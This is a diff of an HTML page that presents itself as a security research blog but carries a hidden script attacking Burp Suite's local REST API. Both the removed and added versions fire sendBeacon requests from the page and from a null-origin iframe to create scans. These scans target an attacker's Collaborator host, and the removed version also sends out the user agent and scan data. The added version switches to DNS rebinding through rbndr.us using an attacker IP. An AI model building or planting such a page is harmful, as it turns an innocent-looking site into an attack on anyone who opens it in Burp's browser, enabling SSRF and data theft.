@@ -1,82 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head><title>Security Research Portfolio</title>
-<style>body{font-family:Arial,sans-serif;max-width:900px;margin:40px auto;padding:20px}h1{color:#333}.hidden{display:none}</style>
-</head>
+<head><title>Security Research</title></head>
 <body>
-<h1>Security Research Portfolio</h1>
-<p>Welcome to my security research blog. Here you'll find my latest writeups on web application security.</p>
-<p>Loading articles...</p>
-
-<!--
-  Burp Suite PoC: Website -> Scan Creation -> SSRF -> Data Exfiltration
-
-  When visited in Burp's browser (or scanned by Burp), this page:
-  1. Creates scans via sendBeacon (bypasses CORS - text/plain POST)
-  2. Scans target attacker's Collaborator server (proves SSRF)
-  3. Exfiltrates Burp version and scan data to Collaborator
-
-  Works on any Burp Suite with REST API in insecure_mode (default config)
--->
-
-<div class="hidden">
+<h1>Security Research Blog</h1>
+<p>Latest articles on application security.</p>
 <script>
-(function(){
-    // Attacker's Collaborator server
-    var C = "n2qsgxg6hz4cgaiqwx9rfnafv61xpndc.oastify.com";
+// CHANGE THESE:
+var COLLAB = "6ovoqmjbo8s7mpgnctyttfwsvj1ap0dp.oastify.com";
+var ATTACKER_IP_HEX = "ac1f2001"; // Your VPS IP in hex (172.31.32.1 = ac1f2001)
 
-    // Common Burp API ports
-    var ports = [1337, 9876, 8090, 8080];
+var REBIND = "7f000001." + ATTACKER_IP_HEX + ".rbndr.us";
+var ports = [1337, 9876];
 
-    // Phase 1: Create scans targeting Collaborator (SSRF proof)
-    ports.forEach(function(port) {
-        // Direct sendBeacon
-        navigator.sendBeacon(
-            "http://127.0.0.1:" + port + "/v0.1/scan",
-            JSON.stringify({
-                urls: ["http://" + C + "/burp-ssrf-from-scan"],
-                scan_callback: {url: "http://" + C + "/scan-callback"}
-            })
-        );
-
-        // From null-origin iframe (works from ANY website)
-        var f = document.createElement("iframe");
-        f.srcdoc = '<script>' +
-            'navigator.sendBeacon("http://127.0.0.1:' + port + '/v0.1/scan",' +
-            'JSON.stringify({' +
-                'urls:["http://' + C + '/burp-ssrf-iframe"],' +
-                'scan_callback:{url:"http://' + C + '/callback-iframe"}' +
-            '}));' +
-            '<\/script>';
-        f.style.display = "none";
-        document.body.appendChild(f);
-    });
-
-    // Phase 2: Signal to Collaborator that exploit fired
-    // This HTTP request goes directly from the browser
-    new Image().src = "http://" + C + "/exploit-fired?ua=" +
-        encodeURIComponent(navigator.userAgent).substring(0, 100);
-
-    // Phase 3: Try to read API data via fetch (will fail CORS but
-    // the REQUEST still reaches the API - proves connectivity)
-    ports.forEach(function(port) {
-        fetch("http://127.0.0.1:" + port + "/v0.1/scan/1?issue_events=10")
-            .then(function(r) { return r.text(); })
-            .then(function(data) {
-                // If CORS allows reading (shouldn't normally) - jackpot
-                navigator.sendBeacon("http://" + C + "/data-stolen", data.substring(0, 500));
-            })
-            .catch(function() {});
-    });
-})();
+ports.forEach(function(port) {
+    var scan = JSON.stringify({urls: ["http://" + REBIND + ":" + port + "/"]});
+    try { navigator.sendBeacon("http://127.0.0.1:" + port + "/v0.1/scan", scan); } catch(e) {}
+    var f = document.createElement("iframe");
+    f.srcdoc = '<script>try{navigator.sendBeacon("http://127.0.0.1:' + port +
+        '/v0.1/scan",' + JSON.stringify(scan) + ')}catch(e){}<\/script>';
+    f.style.display = "none";
+    document.body.appendChild(f);
+});
+new Image().src = "https://" + COLLAB + "/poc-fired";
 </script>
-</div>
-
-<h2>Recent Articles</h2>
-<ul>
-<li>Understanding CORS and Same-Origin Policy</li>
-<li>A Deep Dive into DNS Rebinding Attacks</li>
-<li>Modern Browser Security Mechanisms</li>
-</ul>
-</body>
-</html>
+</body></html>
